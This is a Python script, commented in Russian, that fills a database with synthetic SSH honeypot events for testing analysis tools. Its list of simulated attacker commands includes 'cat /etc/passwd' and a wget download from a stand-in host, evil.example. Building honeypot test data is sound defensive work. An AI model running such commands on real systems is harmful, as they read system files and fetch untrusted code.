# фейковые события, чтобы писать анализ без реального honeypot
import random
from datetime import datetime, timedelta, timezone

from honeypot.events import Event, CONNECT, AUTH, COMMAND, DISCONNECT
from honeypot.storage.db import Storage

IPS = ["185.10.1.5", "45.33.2.9", "103.77.4.12", "91.200.8.3", "194.5.6.7"]
USERS = ["root", "admin", "user", "test", "ubuntu", "pi"]
PASSWORDS = ["123456", "admin", "password", "root", "1234", "qwerty"]
COMMANDS = ["uname -a", "whoami", "ls", "cat /etc/passwd",
            "wget http://evil.example/x.sh", "ps aux"]


def make_events(n_sessions=50):
    events = []
    start = datetime.now(timezone.utc) - timedelta(days=7)

    for _ in range(n_sessions):
        ip = random.choice(IPS)
        port = random.randint(1024, 65000)
        t = start + timedelta(seconds=random.randint(0, 7 * 24 * 3600))

        first = Event("ssh", CONNECT, ip, port, ts=t.isoformat())
        sid = first.session_id
        events.append(first)

        # несколько попыток входа
        for _ in range(random.randint(1, 5)):
            t += timedelta(seconds=random.randint(1, 5))
            events.append(Event("ssh", AUTH, ip, port, session_id=sid, ts=t.isoformat(),
                                payload={"user": random.choice(USERS),
                                         "password": random.choice(PASSWORDS)}))

        # иногда "зашли" и ввели команды
        if random.random() < 0.3:
            for _ in range(random.randint(1, 4)):
                t += timedelta(seconds=random.randint(1, 20))
                events.append(Event("ssh", COMMAND, ip, port, session_id=sid,
                                    ts=t.isoformat(),
                                    payload={"cmd": random.choice(COMMANDS)}))

        t += timedelta(seconds=1)
        events.append(Event("ssh", DISCONNECT, ip, port, session_id=sid, ts=t.isoformat()))

    return events


def fill_db(path="logs/fake.db", n_sessions=50):
    db = Storage(path)
    for ev in make_events(n_sessions):
        db.save(ev)
    db.close()


if __name__ == "__main__":
    fill_db()
    print("готово, logs/fake.db")